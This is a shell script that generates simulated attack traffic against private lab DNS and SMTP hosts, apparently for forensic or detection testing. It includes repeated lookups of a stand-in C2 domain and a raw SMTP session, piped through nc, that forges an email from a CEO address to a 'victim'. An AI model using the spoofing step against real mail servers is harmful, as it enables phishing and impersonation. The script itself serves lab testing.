#!/bin/sh
set -eu

# Preamble: This script simulates various attack vectors targeting DNS and SMTP services.
# It includes DNS tracking queries, censorship attempts, C2 beacon simulations,
# SMTP spoofed emails, and SMTP C2 beacon simulations.

DNS_HOST="192.168.10.40"
SMTP_HOST="192.168.10.30"

section() { printf "\n=== %s ===\n" "$1"; }

# ---- Tracking Queries ----
section "DNS Tracking Queries"
dig @"${DNS_HOST}" tracking.lab +short || true
dig @"${DNS_HOST}" telemetry.lab +short || true
dig @"${DNS_HOST}" updates.lab +short || true

# ---- Censorship / Blocking ----
section "DNS Censorship / Blocking"
dig @"${DNS_HOST}" facebook.com +short || true
dig @"${DNS_HOST}" reddit.com +short || true
dig @"${DNS_HOST}" discord.com +short || true

# ---- DNS C2 Beacon Simulation ----
section "DNS C2 Beacon Queries"
for i in $(seq 1 3); do
  dig @"${DNS_HOST}" c2.badguy.net +short || true
  sleep 1
done

# ---- SMTP Spoofing ----
section "SMTP Spoofed Email"
{
  printf 'EHLO client.local\r\n'
  printf 'MAIL FROM:<ceo@forensic.lab>\r\n'
  printf 'RCPT TO:<victim@forensic.lab>\r\n'
  printf 'DATA\r\n'
  printf 'Subject: Urgent - External Spoof Test\r\n'
  printf '\r\n'
  printf 'This message was spoofed via SMTP with no SPF/DMARC.\r\n'
  printf '.\r\n'
  printf 'QUIT\r\n'
} | nc -w 5 "${SMTP_HOST}" 1025 >/dev/null 2>&1 || true

# ---- SMTP C2 Beacon ----
section "SMTP C2 Beacon Simulation"
for i in $(seq 1 3); do
  {
    printf 'EHLO beacon.local\r\n'
    printf 'QUIT\r\n'
  } | nc -w 3 "${SMTP_HOST}" 1025 >/dev/null 2>&1 || true
  sleep 1
done

echo
echo "Attack vectors completed."
